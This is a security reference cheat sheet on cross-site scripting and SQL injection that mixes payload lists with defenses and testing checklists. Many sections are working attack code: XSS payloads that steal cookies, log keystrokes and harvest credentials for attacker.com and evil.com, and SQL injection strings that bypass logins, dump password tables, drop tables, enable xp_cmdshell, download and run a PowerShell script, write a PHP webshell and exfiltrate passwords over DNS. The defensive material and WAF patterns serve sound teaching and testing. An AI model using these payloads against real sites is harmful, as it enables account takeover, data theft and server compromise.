# Web Injection Attacks: XSS & SQL Injection

A comprehensive reference for understanding, testing, and defending against cross-site scripting and SQL injection vulnerabilities.

---

## Table of Contents

1. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
   - [How XSS Works](#how-xss-works)
   - [Types of XSS](#types-of-xss)
   - [Basic Payloads](#basic-xss-payloads)
   - [Filter Bypass Techniques](#filter-bypass-techniques)
   - [Advanced Payloads](#advanced-xss-payloads)
   - [Real-World Attack Scenarios](#real-world-xss-attack-scenarios)
   - [DOM-Based XSS Deep Dive](#dom-based-xss-deep-dive)
   - [XSS in Different Contexts](#xss-in-different-contexts)
   - [Defenses](#xss-defenses)
2. [SQL Injection (SQLi)](#sql-injection-sqli)
   - [How SQLi Works](#how-sqli-works)
   - [Types of SQL Injection](#types-of-sql-injection)
   - [Basic Payloads](#basic-sqli-payloads)
   - [Database Enumeration](#database-enumeration)
   - [Advanced Techniques](#advanced-sqli-techniques)
   - [Blind SQLi Deep Dive](#blind-sqli-deep-dive)
   - [Database-Specific Syntax](#database-specific-syntax)
   - [Vulnerable vs Safe Code](#vulnerable-vs-safe-code)
   - [Defenses](#sqli-defenses)
3. [Quick Comparison](#quick-comparison)
4. [Testing Methodology](#testing-methodology)
5. [Tools](#tools)

---

## Cross-Site Scripting (XSS)

### How XSS Works

XSS exploits the browser's trust in a website. When a page renders unescaped user input as HTML, the browser cannot distinguish between the site's legitimate scripts and attacker-injected ones. The injected script runs in the victim's browser with the same privileges as the site itself — meaning it can read cookies, make requests on the user's behalf, alter the page, or redirect the user elsewhere.

The core problem is **mixing data and code**: user-supplied strings are treated as executable HTML/JavaScript instead of inert text.

```
Normal flow:  User input → stored/reflected → browser renders as TEXT
Vulnerable:   User input → stored/reflected → browser renders as CODE
```

---

### Types of XSS

| Type | Persistence | Server involved? | Who is affected? |
|------|-------------|-----------------|------------------|
| **Reflected** | Non-persistent | Yes (echoes input) | Anyone who clicks the crafted link |
| **Stored** | Persistent | Yes (saves to DB) | Every user who views the affected page |
| **DOM-based** | Either | No (client-side only) | Depends on how payload is distributed |
| **Self-XSS** | Non-persistent | Varies | Only the victim themselves |
| **Blind XSS** | Persistent | Yes | Admin/internal users who view logs or panels |

---

### Basic XSS Payloads

These are the building blocks — useful for confirming a reflection point exists.

```html
<!-- Classic script tag -->
<script>alert('XSS')</script>

<!-- Script with document.domain to show context -->
<script>alert(document.domain)</script>

<!-- Image with broken src, fires onerror -->
<img src="x" onerror="alert(1)">

<!-- Input autofocus with onfocus handler -->
<input autofocus onfocus="alert(1)">

<!-- Body onload -->
<body onload="alert(1)">

<!-- SVG with onload -->
<svg onload="alert(1)"></svg>

<!-- Anchor with javascript: protocol -->
<a href="javascript:alert(1)">Click</a>

<!-- Details/summary HTML5 element -->
<details open ontoggle="alert(1)">

<!-- Video with onerror -->
<video src="x" onerror="alert(1)"></video>

<!-- Iframe srcdoc -->
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

---

### Filter Bypass Techniques

Most real-world targets have some filtering. These techniques are used to evade naive blacklists.

#### Case and encoding tricks

```html
<!-- Mixed case (bypasses case-sensitive filters) -->
<ScRiPt>alert(1)</sCrIpT>

<!-- HTML entity encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- URL encoding inside an attribute -->
<a href="javascript:%61%6C%65%72%74%281%29">click</a>

<!-- Double URL encoding -->
<a href="javascript:%2561%256C%2565%2572%2574(1)">click</a>

<!-- Hex encoding in href -->
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">x</a>
```

#### Whitespace and tag tricks

```html
<!-- Tabs and newlines in attributes (bypass simple regex) -->
<img src="x"	onerror="alert(1)">
<img src="x"
onerror="alert(1)">

<!-- No quotes around attribute value -->
<img src=x onerror=alert(1)>

<!-- Slash before > (valid HTML5) -->
<img src=x onerror=alert(1) />

<!-- Null byte injection (older parsers) -->
<scri\x00pt>alert(1)</scri\x00pt>

<!-- Extra < to confuse parser -->
<<script>alert(1)</script>

<!-- Unclosed tag -->
<svg/onload=alert(1)
```

#### Breaking out of attribute context

```html
<!-- Breaking out of a double-quoted attribute -->
"><script>alert(1)</script>

<!-- Breaking out of a single-quoted attribute -->
'><script>alert(1)</script>

<!-- Breaking out without closing the tag -->
" onmouseover="alert(1)

<!-- Breaking out of a value inside a JS string in an attribute -->
"; alert(1); //
```

#### Filter evasion using JavaScript

```html
<!-- String concatenation to avoid keyword detection -->
<script>eval('al'+'ert(1)')</script>

<!-- Using setTimeout with a string -->
<script>setTimeout('alert(1)',0)</script>

<!-- atob (base64 decode) -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- Function constructor -->
<script>[].constructor.constructor('alert(1)')()</script>

<!-- Template literals -->
<script>eval(`al${'er'}t(1)`)</script>
```

---

### Advanced XSS Payloads

#### Cookie theft

```html
<script>
  new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
</script>
```

#### Keylogger

```html
<script>
  document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?k=' + e.key);
  });
</script>
```

#### Session hijacking via XMLHttpRequest

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://attacker.com/?cookie=' + document.cookie, true);
  xhr.send();
</script>
```

#### Page defacement

```html
<script>
  document.body.innerHTML = '<h1 style="color:red;text-align:center">Hacked</h1>';
</script>
```

#### Forced redirect

```html
<script>window.location = 'https://attacker.com/phish';</script>
```

#### BeEF hook (Browser Exploitation Framework)

```html
<!-- Hooks the browser into BeEF's command-and-control panel -->
<script src="https://attacker.com:3000/hook.js"></script>
```

#### Credential harvesting (phishing overlay)

```html
<script>
  document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999">
      <form action="https://attacker.com/harvest" method="POST">
        <p>Session expired. Please log in again.</p>
        <input name="user" placeholder="Username">
        <input name="pass" type="password" placeholder="Password">
        <button>Login</button>
      </form>
    </div>`;
</script>
```

#### XSS via fetch to exfiltrate page content

```html
<script>
  fetch('/admin/users')
    .then(r => r.text())
    .then(data => fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: data
    }));
</script>
```

---

### Real-World XSS Attack Scenarios

#### Scenario 1: Stored XSS in a comment field

A blog allows HTML in comments. An attacker posts:

```html
Great post! <script>document.location='https://evil.com/?c='+document.cookie</script>
```

Every subsequent visitor who loads that page sends their session cookie to the attacker.

#### Scenario 2: Reflected XSS via search

The site reflects the search term: `Results for: <b>TERM</b>`

Attacker crafts a URL and sends it via phishing email:

```
https://victim.com/search?q=<script>fetch('https://evil.com/?c='+btoa(document.cookie))</script>
```

#### Scenario 3: Blind XSS in a support ticket

A user submits a support ticket with a hidden payload. The payload fires when a support agent opens it in their admin panel — potentially stealing the admin's session.

```html
"><script src="https://attacker.com/hook.js"></script>
```

---

### DOM-Based XSS Deep Dive

DOM XSS never touches the server — the payload lives in the URL fragment or client-side storage and is processed entirely by JavaScript.

#### Common vulnerable sinks (places that execute data as code)

```javascript
document.write()
document.writeln()
element.innerHTML
element.outerHTML
eval()
setTimeout(string, ...)   // only when first arg is a string
setInterval(string, ...)
location.href = userInput
```

#### Common vulnerable sources (places data enters from)

```javascript
location.hash
location.search
location.href
document.referrer
window.name
localStorage / sessionStorage
postMessage data
```

#### Example — vulnerable code

```javascript
// URL: https://example.com/page#<img src=x onerror=alert(1)>
var hash = location.hash.slice(1);
document.getElementById('output').innerHTML = hash; // sink: innerHTML
```

#### Example — safe version

```javascript
var hash = location.hash.slice(1);
document.getElementById('output').textContent = hash; // textContent never executes HTML
```

---

### XSS in Different Contexts

The encoding you need depends on *where* the payload lands in the page.

#### HTML body context

```html
<!-- Input lands inside a tag: -->
<p>USER_INPUT</p>

<!-- Payload: -->
<script>alert(1)</script>
```

#### HTML attribute context (double-quoted)

```html
<!-- Input lands in an attribute: -->
<input value="USER_INPUT">

<!-- Payload — break out of the attribute: -->
" onmouseover="alert(1)
```

#### JavaScript string context

```html
<!-- Input lands inside a JS string: -->
<script>var name = "USER_INPUT";</script>

<!-- Payload — break out of the string: -->
"; alert(1); //
```

#### URL context

```html
<!-- Input lands in an href or src: -->
<a href="USER_INPUT">link</a>

<!-- Payload: -->
javascript:alert(1)
```

#### CSS context (rare but possible)

```html
<style>
  body { background: url("USER_INPUT"); }
</style>

<!-- Payload (older IE): -->
javascript:alert(1)
```

---

### XSS Defenses

#### Output encoding (context-sensitive)

| Context | Encoding needed |
|---------|----------------|
| HTML body | `&`, `<`, `>`, `"`, `'` → HTML entities |
| HTML attribute | Same as above + encode all non-alphanumeric |
| JavaScript string | `\`, `'`, `"`, newlines → `\x` hex escapes |
| URL parameter | `encodeURIComponent()` |
| CSS value | `\HH` hex escape |

```python
# Python — using markupsafe
from markupsafe import escape
safe_output = escape(user_input)

# Never do this:
return f"<p>{user_input}</p>"

# Do this instead:
return f"<p>{escape(user_input)}</p>"
```

```javascript
// JavaScript — safe DOM manipulation
// BAD:
element.innerHTML = userInput;

// GOOD:
element.textContent = userInput;
// or build nodes with the DOM API:
const p = document.createElement('p');
p.textContent = userInput;
container.appendChild(p);
```

#### Content Security Policy (CSP)

```
# Strict CSP — blocks inline scripts and only allows same-origin scripts
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'

# With nonce — allows specific inline scripts
Content-Security-Policy: script-src 'nonce-RANDOM_VALUE_HERE'

# Report-only mode (monitoring, not blocking)
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

```html
<!-- Inline script with nonce — only runs if nonce matches the header -->
<script nonce="RANDOM_VALUE_HERE">
  // This is allowed
</script>
```

#### Cookie flags

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly` — prevents JavaScript from reading the cookie
- `Secure` — cookie only sent over HTTPS
- `SameSite=Strict` — prevents cookie being sent on cross-site requests (mitigates CSRF too)

#### Sanitization libraries

When you genuinely need to allow some HTML (e.g. a rich text editor), sanitize rather than escape:

```javascript
// DOMPurify — JavaScript sanitization library
const clean = DOMPurify.sanitize(dirtyHTML);
element.innerHTML = clean;
```

```python
# bleach — Python sanitization
import bleach
clean = bleach.clean(user_html, tags=['p','b','i','a'], attributes={'a': ['href']})
```

---

## SQL Injection (SQLi)

### How SQLi Works

SQL injection exploits the **database's trust** in the application. When user input is concatenated directly into a SQL query string, the database interprets the input as part of the query structure — not just a value. An attacker can break out of the intended value context and inject arbitrary SQL.

```
Normal:     SELECT * FROM users WHERE id = '42'
Injected:   SELECT * FROM users WHERE id = '' OR 1=1 --'
                                        ^^^^^^^^^^^^^^^^^^
                                        attacker-controlled
```

---

### Types of SQL Injection

| Type | Sub-type | Data returned via | Speed |
|------|----------|-------------------|-------|
| **In-band** | Union-based | Direct HTTP response | Fast |
| **In-band** | Error-based | DB error messages | Fast |
| **Blind** | Boolean-based | True/false page differences | Slow |
| **Blind** | Time-based | Response delay | Very slow |
| **Out-of-band** | DNS/HTTP | External channel (DNS lookup, HTTP request) | Varies |

---

### Basic SQLi Payloads

#### Authentication bypass

```sql
-- Classic OR bypass in login form
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
" OR "1"="1
" OR "1"="1" --

-- Target a specific user
admin'--
admin'#
admin'/*

-- Always-true with numeric input
1 OR 1=1
1; SELECT 1

-- Bypass with different whitespace (tab, newline)
'	OR	'1'='1
```

#### Comment syntax by database

```sql
-- MySQL
' OR 1=1 #
' OR 1=1 -- -     (note the trailing space or dash)

-- MSSQL / Oracle / PostgreSQL
' OR 1=1 --

-- MySQL multi-line comment
' OR 1=1 /*comment*/

-- Inline comment to bypass keyword filters
SE/**/LECT * FR/**/OM users
```

---

### Database Enumeration

Once injection is confirmed, enumerate the database structure.

#### Find number of columns (for UNION attacks)

```sql
-- ORDER BY to find column count (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    -- error here means 2 columns

-- NULL-based UNION to find column count
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

#### UNION-based data extraction

```sql
-- Basic UNION to pull usernames and passwords
' UNION SELECT username, password FROM users--

-- Concat multiple values into one column
' UNION SELECT NULL, username || ':' || password FROM users--   (PostgreSQL / Oracle)
' UNION SELECT NULL, CONCAT(username,':',password) FROM users-- (MySQL)

-- Extract database name
' UNION SELECT NULL, database()--          (MySQL)
' UNION SELECT NULL, current_database()--  (PostgreSQL)
' UNION SELECT NULL, db_name()--           (MSSQL)

-- List all tables
' UNION SELECT NULL, table_name FROM information_schema.tables--

-- List columns in a table
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--
```

#### Error-based extraction

```sql
-- MySQL — extractvalue forces an XPath error containing the data
' AND extractvalue(1, concat(0x7e, (SELECT database()))) --

-- MySQL — updatexml
' AND updatexml(1, concat(0x7e,(SELECT version())),1) --

-- MSSQL — convert type mismatch leaks value
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --

-- PostgreSQL — cast error
' AND CAST((SELECT version()) AS int)--
```

---

### Advanced SQLi Techniques

#### Stacked queries (batched statements)

Some drivers allow multiple statements separated by `;`:

```sql
-- Drop a table
'; DROP TABLE users; --

-- Create a backdoor admin user
'; INSERT INTO users (username,password,role) VALUES ('hacker','hashed','admin'); --

-- MSSQL — enable xp_cmdshell for OS commands
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --
```

#### OS command execution (MSSQL xp_cmdshell)

```sql
-- Run a system command and return output
'; EXEC xp_cmdshell('whoami'); --

-- Download and execute a file
'; EXEC xp_cmdshell('powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'); --
```

#### File read / write

```sql
-- MySQL — read a file (requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL --

-- MySQL — write a webshell (requires write access)
' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/var/www/html/shell.php' --

-- PostgreSQL — read a file using COPY
'; COPY users TO '/tmp/dump.csv'; --

-- MSSQL — read file using BULK INSERT or OPENROWSET
'; SELECT * FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) AS x; --
```

#### Second-order SQLi

The payload is stored safely at first but injected unsafely when retrieved and reused:

```
Step 1: Register username:  admin'--
         Stored as:          admin'--    (escaped on insert)

Step 2: App fetches username to build another query:
         "SELECT * FROM profiles WHERE user='" + username + "'"
         → "SELECT * FROM profiles WHERE user='admin'--'"
         → Comment truncates the query, bypassing any WHERE condition
```

#### Out-of-band exfiltration

Useful when there is no visible output and time-based is too slow.

```sql
-- MySQL — DNS lookup containing extracted data
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\x'))--

-- MSSQL — DNS via xp_dirtree
'; DECLARE @q varchar(1024); SET @q='\\'+( SELECT TOP 1 password FROM users)+'.attacker.com\x'; EXEC xp_dirtree @q; --

-- PostgreSQL — using dblink to make HTTP/DNS
'; SELECT dblink_connect('host='||(SELECT current_user)||'.attacker.com user=x password=x'); --
```

---

### Blind SQLi Deep Dive

When the application returns no visible data, you extract information bit by bit from the application's behaviour.

#### Boolean-based blind

The page renders differently depending on whether the injected condition is true or false.

```sql
-- Confirm injection (true condition — page loads normally)
' AND 1=1--

-- False condition — page changes (blank, error, different content)
' AND 1=2--

-- Extract database name character by character
' AND SUBSTRING(database(),1,1)='a'--   -- is first char 'a'?
' AND SUBSTRING(database(),1,1)='b'--   -- is first char 'b'?
-- ... repeat until match, then move to position 2

-- Binary search approach (faster — bisect the ASCII range)
' AND ASCII(SUBSTRING(database(),1,1)) > 109--   -- is first char > 'm'?
' AND ASCII(SUBSTRING(database(),1,1)) > 122--   -- is first char > 'z'?
```

#### Time-based blind

No difference in page content — instead infer true/false from response time.

```sql
-- MySQL — SLEEP
' AND SLEEP(5)--                          -- always sleeps 5 seconds
' AND IF(1=1, SLEEP(5), 0)--              -- true → sleep
' AND IF(1=2, SLEEP(5), 0)--              -- false → no sleep

-- Extract data with timing
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--

-- MSSQL — WAITFOR DELAY
'; WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users WHERE username='admin') > 0 WAITFOR DELAY '0:0:5'--

-- PostgreSQL — pg_sleep
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Oracle — heavy query (no sleep function)
' AND 1=(SELECT COUNT(*) FROM all_objects, all_objects, all_objects)--
```

---

### Database-Specific Syntax

| Feature | MySQL | MSSQL | PostgreSQL | Oracle |
|---------|-------|-------|-----------|--------|
| Comment | `#` or `--` | `--` | `--` | `--` |
| String concat | `CONCAT(a,b)` | `a+b` | `a\|\|b` | `a\|\|b` |
| Substring | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTR(s,1,1)` |
| Current DB | `database()` | `db_name()` | `current_database()` | `SELECT sys.database_name FROM dual` |
| Version | `version()` | `@@version` | `version()` | `v$version` |
| List tables | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
| Sleep | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | Heavy query |
| File read | `LOAD_FILE('/etc/passwd')` | `BULK INSERT` / `OPENROWSET` | `COPY` | `UTL_FILE` |
| Limit rows | `LIMIT 1` | `TOP 1` | `LIMIT 1` | `ROWNUM = 1` |

---

### Vulnerable vs Safe Code

#### PHP

```php
// VULNERABLE — direct string interpolation
$query = "SELECT * FROM users WHERE username = '$_POST[username]'";
$result = mysqli_query($conn, $query);

// SAFE — prepared statement with PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
$result = $stmt->fetchAll();

// SAFE — prepared statement with mysqli
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $_POST['username']);
$stmt->execute();
```

#### Python

```python
# VULNERABLE
query = "SELECT * FROM users WHERE username = '" + username + "'"
cursor.execute(query)

# Also vulnerable — f-string
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")

# SAFE — parameterized (sqlite3 / psycopg2 / pymysql)
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# SAFE — SQLAlchemy ORM
user = session.query(User).filter(User.username == username).first()

# SAFE — SQLAlchemy Core with bound parameters
stmt = select(users).where(users.c.username == bindparam('uname'))
conn.execute(stmt, {"uname": username})
```

#### Node.js

```javascript
// VULNERABLE — string concatenation
const query = `SELECT * FROM users WHERE id = ${req.params.id}`;
db.query(query, callback);

// SAFE — mysql2 parameterized
db.query('SELECT * FROM users WHERE id = ?', [req.params.id], callback);

// SAFE — pg (PostgreSQL)
pool.query('SELECT * FROM users WHERE id = $1', [req.params.id]);

// SAFE — Knex.js query builder
knex('users').where('id', req.params.id).select();
```

#### Java

```java
// VULNERABLE
String query = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// SAFE — PreparedStatement
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();
```

---

### SQLi Defenses

#### 1. Parameterized queries (primary defense)

Always use placeholders (`?`, `%s`, `$1`) — never concatenate user input into query strings. The database driver handles escaping internally.

#### 2. Stored procedures

Safe *if* they use parameterization internally:

```sql
-- Safe stored procedure (PostgreSQL)
CREATE OR REPLACE FUNCTION get_user(p_username TEXT)
RETURNS TABLE(id INT, username TEXT) AS $$
  SELECT id, username FROM users WHERE username = p_username;
$$ LANGUAGE sql;

-- Calling it safely from application code
cursor.execute("SELECT * FROM get_user(%s)", (username,))
```

Unsafe if the procedure constructs dynamic SQL with `EXEC` / `EXECUTE`:

```sql
-- STILL VULNERABLE even inside a stored procedure
CREATE PROCEDURE search_user @username NVARCHAR(50) AS
BEGIN
  EXEC('SELECT * FROM users WHERE username = ''' + @username + '''')
END
```

#### 3. Input validation

```python
import re

# Whitelist: only allow alphanumeric usernames
if not re.match(r'^[a-zA-Z0-9_]{3,30}$', username):
    raise ValueError("Invalid username")

# Validate numeric IDs
user_id = int(request.args.get('id'))  # raises ValueError if not a number
```

#### 4. Least privilege database accounts

```sql
-- Create a restricted app user (MySQL)
CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON appdb.* TO 'appuser'@'localhost';
-- Do NOT grant DROP, DELETE on sensitive tables, or FILE, SUPER, etc.
```

#### 5. Error handling

```python
# Never expose raw DB errors to the user
try:
    cursor.execute(query, params)
except Exception as e:
    logger.error(f"DB error: {e}")     # log internally
    return "An error occurred", 500    # generic message to user
```

#### 6. WAF rules (supplementary)

Common patterns to detect/block at the WAF layer:

```
' OR 1=1
UNION SELECT
SLEEP(
WAITFOR DELAY
xp_cmdshell
LOAD_FILE
INTO OUTFILE
```

WAFs are an additional layer — **not** a substitute for parameterized queries. Determined attackers will encode or obfuscate payloads to bypass WAF rules.

---

## Quick Comparison

| | XSS | SQL Injection |
|--|-----|---------------|
| **Target** | User's browser | Backend database |
| **Payload language** | HTML / JavaScript | SQL |
| **Injection point** | HTML output, DOM | SQL query string |
| **Impact** | Session theft, credential harvest, malware, defacement | Data breach, auth bypass, data deletion, OS compromise |
| **Persistence** | Reflected (temporary) or Stored (permanent) | Depends on query type |
| **Primary defense** | Output encoding + CSP | Parameterized queries |
| **Detection** | Browser devtools, CSP reports, WAF | Error messages, timing differences, WAF |
| **OWASP Top 10 (2021)** | A03 — Injection | A03 — Injection |

---

## Testing Methodology

### XSS Testing Checklist

```
[ ] Identify all input reflection points (forms, URL params, headers, cookies)
[ ] Determine the output context (HTML body, attribute, JS string, URL, CSS)
[ ] Try a simple probe: <b>test</b> or "><b>test</b>
[ ] Check if input is reflected raw or HTML-encoded
[ ] Test for event handler injection in attribute context
[ ] Test javascript: in href/src attributes
[ ] Test for DOM sources (hash, search, referrer)
[ ] Check for stored XSS in all saved user content
[ ] Try filter bypass techniques if basic payloads are blocked
[ ] Test CSP headers — look for unsafe-inline, unsafe-eval, wildcards
[ ] Verify HttpOnly and SameSite cookie flags
```

### SQLi Testing Checklist

```
[ ] Identify all data entry points (forms, URL params, JSON body, headers, cookies)
[ ] Try a single quote ' — look for errors or changed behaviour
[ ] Try -- comment and observe
[ ] Try 1=1 (true) vs 1=2 (false) — compare responses
[ ] Try SLEEP/WAITFOR to test for blind injection
[ ] Find column count with ORDER BY
[ ] Attempt UNION SELECT to pull data
[ ] Enumerate: database name → tables → columns → data
[ ] Test for stacked queries (;)
[ ] Check error messages for DB type and version
[ ] Test second-order injection via registration/update flows
```

---

## Tools

### XSS Tools

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercept, modify, and replay HTTP requests; active scanner |
| **OWASP ZAP** | Open-source web scanner with XSS detection |
| **XSStrike** | Advanced XSS detection with context-aware payload generation |
| **Dalfox** | Fast, parameter-based XSS scanner written in Go |
| **BeEF** | Browser Exploitation Framework — real-time XSS post-exploitation |
| **XSSer** | Automated XSS injection and exploitation framework |

### SQLi Tools

| Tool | Purpose |
|------|---------|
| **sqlmap** | Automated SQLi detection and exploitation (union, blind, time, OOB) |
| **Burp Suite** | Manual and semi-automated SQLi testing |
| **Havij** | GUI-based SQLi tool (mostly older, educational) |
| **jSQL Injection** | Java-based GUI SQLi tool |
| **NoSQLMap** | Like sqlmap but for NoSQL databases (MongoDB, etc.) |

### General Security Testing

| Tool | Purpose |
|------|---------|
| **Burp Suite Pro** | Full-featured web app pentesting platform |
| **OWASP ZAP** | Free, open-source alternative to Burp |
| **ffuf** | Fast web fuzzer for parameter and path discovery |
| **Nuclei** | Template-based vulnerability scanner |

---

> ⚠️ **Legal Notice:** All techniques in this document are for educational purposes and authorized security testing only. Testing systems without explicit written permission is illegal in most jurisdictions. Always obtain proper authorization before testing any system you do not own.
